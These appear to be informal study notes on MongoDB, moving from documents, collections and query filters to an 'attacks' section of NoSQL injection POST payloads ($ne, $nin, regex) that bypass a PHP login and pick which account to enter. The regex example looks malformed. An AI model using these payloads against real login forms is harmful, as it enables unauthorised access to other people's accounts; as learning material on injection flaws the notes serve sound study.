# MongoDB
MongoDB is another database like MySQL except the information is stored in documents, which can be though as a simple dictionary structure where key-value pairs are stored. It stores multiple documents with similar function in a structure called collections. collections are finally grouped into databases, which is the highest hierarchical element in MongoDB
## Querying database
MongoDB uses filters to retrieve documents such as
```MongoDB
['last_name' => 'Sandler']
```
# attacks
## IDK
php allows you to pass arrays using this which can essentially say if its not equal to the values then it works ig
```POST
user[$ne]=tgst&pass[$ne]=test
```
if you wanted to log in as other users other than the first use in the database you could do a filter like such
```POST
user[$nin][]=admin&user[$nin][]=otheruser&pass[$ne]=test
```
regex can also be used
```POST
user[$ne]=tgst&pass[$ne]=^{4}$
```